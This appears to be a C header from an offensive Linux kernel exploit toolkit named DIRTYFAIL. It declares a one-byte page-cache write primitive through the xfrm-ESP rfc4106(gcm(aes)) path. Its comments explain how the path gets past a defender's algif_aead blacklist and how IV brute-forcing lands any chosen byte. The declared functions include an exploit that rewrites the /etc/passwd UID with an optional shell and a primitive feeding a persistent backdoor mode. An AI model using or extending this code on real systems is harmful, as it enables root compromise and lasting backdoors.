/*
 * DIRTYFAIL — copyfail_gcm.h
 *
 * Single-byte page-cache write via xfrm-ESP `rfc4106(gcm(aes))` AEAD.
 *
 * This module is a sibling primitive to copyfail.c (4-byte authencesn
 * STORE) and dirtyfrag_esp.c (4-byte authencesn STORE via XFRM). It
 * targets the SAME bug class (CVE-2026-43284 xfrm-ESP no-COW path),
 * but uses `rfc4106(gcm(aes))` instead of `authencesn(...)` as the
 * AEAD. That changes the primitive in two useful ways:
 *
 *   1. Coverage. A defender who blacklisted only `algif_aead` to stop
 *      Copy Fail (CVE-2026-31431) is still vulnerable here — neither
 *      algif_aead nor the authencesn template is on the path.
 *
 *   2. Granularity. AES-GCM is a counter-mode cipher; in-place
 *      "decryption" is just XORing the keystream onto the spliced
 *      page byte. We can land an arbitrary single byte at any file
 *      offset (no 4-byte alignment, no 4-byte side-effects) by
 *      brute-forcing the IV until keystream[0] equals
 *      `target_byte XOR desired_byte`.
 *
 * The 1-byte primitive is what makes the persistent backdoor mode
 * (`backdoor.c`) feasible without alignment juggling.
 *
 * Technique credit: 0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo
 * (`copyfail2.c`), reimplemented here in DIRTYFAIL style.
 */

#ifndef DIRTYFAIL_COPYFAIL_GCM_H
#define DIRTYFAIL_COPYFAIL_GCM_H

#include "common.h"

/* Detection: kernel + esp4 + rfc4106(gcm(aes)) availability + userns. */
df_result_t copyfail_gcm_detect(void);

/* End-to-end PoC: flip /etc/passwd UID via rfc4106(gcm(aes)) STORE.
 * Equivalent functional outcome to copyfail_exploit() and
 * dirtyfrag_esp_exploit() — different kernel path. */
df_result_t copyfail_gcm_exploit(bool do_shell);
df_result_t copyfail_gcm_exploit_inner(void);

/* Low-level building block exposed for backdoor.c:
 * write a single byte at `target_path` offset `target_off`. The caller
 * MUST already be inside a fresh user namespace with CAP_NET_ADMIN
 * (ESP SA registration prerequisite). Returns true on apparent
 * success — caller verifies via re-read. */
bool cfg_1byte_write(const char *target_path,
                     off_t target_off,
                     unsigned char desired_byte);

/* Active probe: installs a GCM SA with arbitrary IV, fires ONE
 * gcm_trigger against a /tmp sentinel. Skips IV brute force entirely;
 * the kernel STORE writes an unpredictable byte (keystream XOR 'A')
 * which still confirms the path is reachable. Returns DF_VULNERABLE
 * on byte change, DF_OK if intact, DF_PRECOND_FAIL on AA-block. */
df_result_t copyfail_gcm_active_probe(void);
df_result_t copyfail_gcm_active_probe_inner(void);

#endif
